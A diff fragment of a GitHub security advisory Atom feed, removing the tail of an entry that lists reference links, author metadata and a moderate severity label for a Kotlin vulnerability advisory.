-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53914">https://nvd.nist.gov/vuln/detail/CVE-2026-53914</a></li>
-<li><a href="https://www.jetbrains.com/privacy-security/issues-fixed">https://www.jetbrains.com/privacy-security/issues-fixed</a></li>
-<li><a href="https://github.com/JetBrains/kotlin/commit/bf51df665b458fda7c3eaf436c4d88dc119d7ec6">https://github.com/JetBrains/kotlin/commit/bf51df665b458fda7c3eaf436c4d88dc119d7ec6</a></li>
-<li><a href="https://github.com/JetBrains/kotlin/releases/tag/v2.4.20-Beta1">https://github.com/JetBrains/kotlin/releases/tag/v2.4.20-Beta1</a></li>
-<li><a href="https://github.com/advisories/GHSA-r937-wjx7-w2jp">https://github.com/advisories/GHSA-r937-wjx7-w2jp</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r937-wjx7-w2jp</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-26T15:32:13.000Z</published>
     </entry>
 </feed>
